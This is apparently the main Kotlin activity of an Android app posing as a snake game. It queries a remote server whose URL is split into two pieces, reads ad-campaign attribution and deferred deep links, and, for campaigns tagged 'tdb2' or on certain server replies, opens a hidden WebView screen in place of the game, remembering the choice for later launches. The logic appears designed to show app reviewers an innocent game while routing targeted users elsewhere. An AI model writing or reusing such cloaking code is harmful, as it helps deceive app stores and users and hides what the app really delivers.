package com.snake.io.slither

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.snake.io.slither.AplClasssssssss.Companion.AF_DEV_KEY
import com.snake.io.slither.AplClasssssssss.Companion.C1
import com.snake.io.slither.AplClasssssssss.Companion.CH
import com.snake.io.slither.AplClasssssssss.Companion.D1
import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheckPart1
import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheckPart2
import com.snake.io.slither.databinding.ActivityMainBinding
import com.snake.io.slither.gamerrrrr.GameHolderActivity
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var bindMain: ActivityMainBinding

    var checker: String = "null"
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        jsoup = ""
        deePP(this)

        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {
            //второе включение
            val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPref.getString(CH, "null")) {
                "2" -> {
                    skipMe()
                }
                "3" -> {
                    testMeUAC()
                }
                "4" -> {
                    testWV()
                }
                "nm" -> {
                    testWV()
                }
                "dp" -> {
                    testWV()
                }
                "org" -> {
                    skipMe()
                }
                else -> {
                    skipMe()
                }
            }

        } else {
            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()

            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(linkAppsCheckPart1+linkAppsCheckPart2)
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            when (checker) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afNullRecordedOrNotChecker(1500)
                }
                "2" -> {
                    skipMe()
                }
                "3" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afRecordedForUAC(1500)
                }
                "4" -> {
                    testWV()
                }

            }
        }
    }



    private suspend fun getCheckCode(link: String): String {
        val url = URL(link)
        val oneStr = "1"
        val twoStr = "2"
        val testStr = "3"
        val fourStr = "4"
        val activeStrn = "0"
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = urlConnection.inputStream.bufferedReader().readText()) {

                "1" -> {
                    oneStr
                }
                "2" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, twoStr)
                    editor.apply()
                    twoStr
                }
                "3" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, testStr)
                    editor.apply()
                    testStr
                }
                "4" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, fourStr)
                    editor.apply()
                    fourStr
                }
                else -> {
                    activeStrn
                }
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(C1, null)
                val hawkdeep: String? = sharPref.getString(D1, "null")
                if (hawk1 != null) {
                    if(hawk1.contains("tdb2")){
                        val editor = sharPref.edit()
                        editor.putString(CH, "nm")
                        editor.apply()
                        testWV()
                    } else if (hawkdeep != null){
                        if(hawkdeep.contains("tdb2"))
                        {
                            testWV()
                        }
                        else{
                            val editor = sharPref.edit()
                            editor.putString(CH, "org")
                            editor.apply()
                            skipMe()
                        }
                    }
                    break
                } else {
                    val hawk1: String? = sharPref.getString(C1, null)
                    delay(timeInterval)
                }
            }
        }
    }

    private fun afRecordedForUAC(timeInterval: Long): Job {
        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(C1, null)
                if (hawk1 != null) {
                    testMeUAC()
                    break
                } else {
                    val hawk1: String? = sharPref.getString(C1, null)
                    delay(timeInterval)
                }
            }
        }
    }

    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()
            val dataGotten = data?.get("campaign").toString()
            editor.putString(C1,dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    private fun skipMe() {
        Intent(this, GameHolderActivity::class.java)
            .also { startActivity(it) }
        finish()
    }
    private fun testMeUAC() {
        Intent(this, CanIFilterYouActivity::class.java)
            .also { startActivity(it) }
        finish()
    }
    private fun testWV() {
        Intent(this, WeeeeebStartActivity::class.java)
            .also { startActivity(it) }
        finish()
    }
    fun deePP(context: Context) {
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host
                //тест
                editor.putString(D1,params.toString())
                editor.apply()
                if (params!!.contains("tdb2")){
                    editor.putString(CH, "dp")
                    editor.apply()
                }

            }
            if (appLinkData == null) {

            }

        }
    }





}